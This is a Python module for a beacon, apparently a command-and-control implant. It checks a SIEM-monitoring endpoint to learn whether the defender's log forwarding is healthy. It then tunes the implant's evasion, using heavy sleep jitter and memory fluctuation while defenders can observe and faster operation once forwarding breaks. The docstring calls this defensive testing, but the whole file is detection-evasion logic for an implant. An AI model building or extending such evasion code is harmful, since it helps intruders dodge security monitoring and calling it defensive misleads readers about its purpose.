"""Adaptive evasion routing based on SIEM ingestion health signals.

This module reads from the safe Layer 16 monitoring endpoint (/api/elite/siem-monitor/status)
to detect whether the defender's log forwarding pipeline is operational.
Based on that passive observation, it adjusts the beacon's local evasion posture:
- If forwarding is healthy: maximize stealth (aggressive jitter, memory protection).
- If forwarding is degraded/broken: reduce overhead (faster ops, less jitter).

This is a defensive testing pattern: understand what the SOC can observe, adapt accordingly.
No system modification or log tampering occurs.
"""

from __future__ import annotations

import random
import time
from typing import Any, Dict, Literal


class AdaptiveEvasionRouter:
    """Route beacon behavior based on SIEM pipeline health."""

    def __init__(self, local_api_url: str = "http://localhost:8080/api/elite/siem-monitor/status"):
        self.api_url = local_api_url
        self.last_check_ts: float = 0
        self.last_result: Dict[str, Any] | None = None
        self.cache_ttl_sec: float = 10.0

    def query_siem_health(self, timeout_sec: float = 2.0) -> Dict[str, Any] | None:
        """Query the safe Layer 16 monitoring endpoint.

        Returns a report or None if unreachable.
        """
        try:
            import requests

            resp = requests.get(self.api_url, timeout=timeout_sec)
            if resp.status_code != 200:
                return None

            data = resp.json() or {}
            return data.get("report", {})
        except Exception:
            return None

    def determine_stealth_level(
        self, use_cache: bool = True
    ) -> Literal["paranoid", "balanced", "aggressive"]:
        """Determine evasion posture based on SIEM forwarding health.

        Levels:
        - 'paranoid': All forwarding services active + reachable. Maximize stealth (jitter, memory protection).
        - 'balanced': Mixed signals. Normal operation.
        - 'aggressive': Forwarding down/unreachable. Minimize overhead (faster ops, less noise).
        """
        now = time.time()

        # Use cached result if fresh enough
        if use_cache and self.last_result is not None:
            if (now - self.last_check_ts) < self.cache_ttl_sec:
                return self._analyze_report(self.last_result)

        # Query fresh
        report = self.query_siem_health()
        self.last_check_ts = now
        self.last_result = report

        if report is None:
            # Can't reach monitoring endpoint; assume paranoid (default safe posture)
            return "paranoid"

        return self._analyze_report(report)

    def _analyze_report(self, report: Dict[str, Any]) -> Literal["paranoid", "balanced", "aggressive"]:
        """Analyze a fresh SIEM health report."""
        if not report:
            return "paranoid"

        # Count active/unhealthy services
        services = report.get("services", []) or []
        active_services = sum(1 for s in services if s.get("available") and s.get("active"))
        total_services = len(services)

        # Check destination reachability
        destinations = report.get("destinations", []) or []
        reachable_dests = sum(1 for d in destinations if d.get("reachable"))
        total_dests = len(destinations)

        # Check for recent config changes (potential tampering detection)
        signals = report.get("signals", {}) or {}
        issues = len(signals.get("issues", []) or [])

        # Decision logic
        if issues > 0 or (total_services > 0 and active_services < total_services):
            # Some services are down or recent issues detected
            if total_dests > 0 and reachable_dests == 0:
                # All SIEM destinations unreachable: forwarding is completely broken
                return "aggressive"
            else:
                # Partial degradation
                return "balanced"
        else:
            # Everything operational: stay paranoid (maximize stealth)
            return "paranoid"

    def calculate_sleep_jitter(
        self, base_sleep_sec: float, stealth_level: Literal["paranoid", "balanced", "aggressive"]
    ) -> float:
        """Calculate Gaussian-jittered sleep duration based on stealth level.

        - paranoid: High jitter (1.5-3.0x base), defender is watching
        - balanced: Normal jitter (0.8-1.5x base)
        - aggressive: Low jitter (0.1-0.3x base), go fast
        """
        if stealth_level == "paranoid":
            factor = random.gauss(2.0, 0.5)
            clipped = max(1.5, min(3.0, factor))
        elif stealth_level == "balanced":
            factor = random.gauss(1.1, 0.2)
            clipped = max(0.8, min(1.5, factor))
        else:  # aggressive
            factor = random.gauss(0.2, 0.05)
            clipped = max(0.1, min(0.3, factor))

        return base_sleep_sec * clipped

    def get_memory_protection_mode(
        self, stealth_level: Literal["paranoid", "balanced", "aggressive"]
    ) -> str:
        """Return memory protection mode based on stealth level.

        - paranoid: "page_noaccess" (memory fluctuation, full protection)
        - balanced: "page_guard" (selective guarding)
        - aggressive: "none" (minimal overhead)
        """
        if stealth_level == "paranoid":
            return "page_noaccess"
        elif stealth_level == "balanced":
            return "page_guard"
        else:
            return "none"
